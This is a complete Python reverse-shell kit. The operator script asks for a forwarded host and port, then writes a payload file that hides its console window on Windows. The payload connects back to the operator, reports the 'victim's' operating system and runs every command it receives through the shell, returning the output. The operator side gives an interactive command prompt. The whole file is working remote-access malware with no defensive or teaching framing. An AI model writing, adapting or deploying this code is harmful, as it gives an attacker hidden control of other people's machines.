import socket
import os

print("PLEASE PORT FORWARD (ngrok recommended) BY PORT 22 AND ENTER THE SOURCE'S IP AND PORT")
dns = input("Source \"DNS\": ")
ip = socket.gethostbyname(dns)
port = int(input("Port: "))
the_scripto = """import socket
import subprocess
import os
import time

if os.name == "nt":
    import ctypes
    kernel = ctypes.WinDLL("kernel32")
    user = ctypes.WinDLL("user32")
    console = kernel.GetConsoleWindow()
    user.ShowWindow(console,0)

c = socket.socket()
c.connect(("{}",{}))
time.sleep(1)
c.send("the victim's OS is {}".format(os.name).encode())

while True:
    data = c.recv(4096)
    result = subprocess.run("{}".format(data.decode()),shell=True,capture_output=True)
    c.send(str(result.stdout.decode()).encode())""".format(ip,port,"{}","{}")
file_time = input("Enter a file name: ")
started = True
lol = open("{}.py".format(file_time),"a+")
lol.truncate(0)
lol.write(the_scripto)
lol.close()
s = socket.socket()
s.bind(("localhost",22))
s.listen()
while True:
    client,(ip,port) = s.accept()
    while True:
        if started == True:
            data = client.recv(4096)
            print(data.decode())
            started = False
        cmd = input("> ")
        client.send("{}".format(cmd).encode())
        data = client.recv(4096)
        print(data.decode())
